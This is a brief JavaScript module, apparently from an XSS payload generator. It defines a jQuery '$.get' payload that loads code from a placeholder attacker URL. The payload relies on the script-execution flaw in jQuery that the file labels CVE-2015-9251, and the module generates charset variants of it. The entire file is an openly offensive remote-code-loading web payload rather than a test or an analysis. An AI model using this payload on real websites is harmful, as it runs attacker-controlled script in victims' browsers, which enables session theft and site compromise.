const generateCharsets = require('../lib/generateCharsets')
const script = '$.get($$PAYLOAD_URL$$)'
module.exports = {
    description: `Standard JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
    script: script,
    charsets: generateCharsets(script)
}

